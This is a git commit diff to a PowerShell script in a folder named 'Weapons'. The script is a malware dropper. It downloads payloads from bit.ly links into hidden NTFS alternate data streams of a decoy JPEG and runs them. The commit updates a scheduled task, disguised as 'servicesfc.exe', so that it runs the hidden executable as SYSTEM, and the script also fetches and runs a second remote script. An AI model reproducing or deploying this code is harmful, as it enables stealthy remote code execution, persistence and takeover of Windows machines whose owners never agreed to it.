44d11b06aec42bd4e9a442dabed834fe2b05c653
Anant Kaul <56610952+anantkaul@users.noreply.github.com>
2022-03-05 06:06:01 +0530

    Updated SCHTASKS

--- Weapons/reg64.ps1
+++ Weapons/reg64.ps1
@@ -4,5 +4,5 @@ mkdir C:\ProgramData\.temp
 [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
 curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jpg
 cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.exe && C:\ProgramData\.temp\94002.jpg:services.exe"
-schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 25/12/2025 /st 15:00:00 /V1 /Z
+schtasks /create /s $env:ComputerName /ru "SYSTEM" /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 12/25/2025 /st 15:00:00 /v1 /z
 cmd /c "wget https://bit.ly/3KlymYH -o C:\ProgramData\.temp\94002.jpg:system64.ps1 && C:\ProgramData\.temp\94002.jpg:system64.ps1"
